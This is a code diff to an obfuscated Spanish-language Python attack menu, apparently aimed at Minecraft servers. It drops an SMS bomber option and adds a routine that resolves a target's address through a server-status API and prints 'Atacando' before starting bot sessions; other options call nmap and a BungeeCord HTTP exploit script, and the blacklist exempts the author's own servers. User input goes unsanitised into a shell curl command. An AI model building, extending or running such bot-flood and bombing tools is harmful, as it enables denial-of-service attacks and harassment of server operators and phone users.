@@ -20,10 +20,6 @@ import click
 import os
 os .system ("clear")
 fecha =datetime .datetime .now ()
-
-def sms ():
-    os .system ("sudo python LPSMSBomber.py")
-
 def exploit ():
     os .system ("sudo python3 LPExploit.py")
 def nmap ():
@@ -57,13 +53,24 @@ def bots ():
     elif O0OOO0OO00OO00OO0 ==5 :
         OOOOO0O0OOO00O00O =110
     elif O0OOO0OO00OO00OO0 ==6 :
-        OOOOO0O0OOO00O00O =210
+        OOOOO0O0OOO00O00O =4
     elif O0OOO0OO00OO00OO0 ==7 :
-        OOOOO0O0OOO00O00O = raw_input("[LPBot] Introduce el Protocolo: ")
+        OOOOO0O0OOO00O00O = input("[LPBot] Introduce el Protocolo: ")
     else :
         synckill ('\n\033[1;31;40m[!] Invalid option!')
     OOO0O00OO0000O00O =['latinplay.net','mc.latinplay.net']
-    O0OOOO0O0O0000O0O =raw_input ('\033[1;32;40m[-] IP: ')
+    ip =raw_input ('\033[1;32;40m[-] IP: ')
+    r1 = os.popen("curl -s https://api.mcsrvstat.us/2/" + ip).read()
+    start1 = ("\"ip\":\"")
+    end1 = "\","
+    a1 = (r1.split(start1))[1].split(end1)[0]
+    
+    r2 = os.popen("curl -s https://api.mcsrvstat.us/2/" + ip).read()
+    start2 = ("\"port\":")
+    end2 = ","
+    a2  = (r2.split(start2))[1].split(end2)[0]
+    O0OOOO0O0O0000O0O = (a1 + ":" + a2)
+    print("[LPBot] Atacando " + str(O0OOOO0O0O0000O0O))
     if (O0OOOO0O0O0000O0O in OOO0O00OO0000O00O ):
         synckill ('\n\033[1;31;40m[!] IP Blacklisted!')
     O00000O0OO00OOO0O =input ('\033[1;32;40m[-] Sesiones: ')
@@ -302,13 +309,9 @@ print (" 3 - Bots")
 print ("")
 print (" 4 - HTTP Exploit (BungeeCord)")
 print ("")
-print (" 5 - SMS Bomber (Only US)")
-print ("")
-print (" 6 - Salir")
+print (" 5 - Salir")
 print ("------------------------------------------------------")
 print ("")
-print (" - Herramienta desarrollada por GhostyCeh - ")
-print ("             > Open Source <                ")
 eleccion =input ("> Seleccióna una opción [1-5]: ")
 if (eleccion ==1 ):
     nmap ()
@@ -319,6 +322,4 @@ if (eleccion ==3 ):
 if (eleccion ==4 ):
     exploit ()
 if (eleccion ==5 ):
-    sms()
-if (eleccion ==6 ):
     synckill ('\n\033[1;31;40m[!] Que tenga un buen dia!')
